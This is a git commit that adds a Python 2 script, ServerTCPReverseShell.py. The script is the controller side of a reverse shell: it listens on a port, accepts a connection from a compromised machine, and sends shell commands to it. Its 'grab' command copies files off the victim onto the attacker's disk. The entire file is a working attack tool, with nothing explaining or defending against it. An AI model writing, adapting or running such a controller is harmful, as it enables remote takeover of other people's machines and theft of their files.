951e6c7f1355bbf8719fa0ef1265b8991623fd59
jinverar <jinverar@gmail.com>
2016-10-30 16:09:17 -0400

    first commit

---
+++ ServerTCPReverseShell.py
@@ -0,0 +1,50 @@
+#!/bin/env python
+
+import socket
+import os
+
+def transfer(conn,command):
+	conn.send(command)
+	f = open('/root/Desktop/test.py','wb')
+	while True:
+		bits = conn.recv(1024)
+		if 'Unable to find out the file' in bits:
+			print '[-] Unable to find out the file'
+			break
+		if bits.endswith('DONE'):
+			print '[+] Transfer completed '
+			f.close()
+			break
+		f.write(bits)
+	f.close()
+
+
+
+def connect():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.bind(("192.168.1.39", 8081))
+	s.listen(1)
+	conn, addr = s.accept()
+	print '[+] We got a connection from: ',addr
+	
+	
+	
+	while True:
+		command = raw_input("Shell> ")
+		
+		if 'terminate' in command:
+			conn.send('terminate')
+			conn.close() #close the connection with host
+			break
+		elif 'grab' in command:
+			#usage shell > grab*file
+			transfer(conn,command)
+		else:
+			conn.send(command) #send command
+			print conn.recv(1024)
+			
+			
+			
+def main ():
+	connect()
+main()
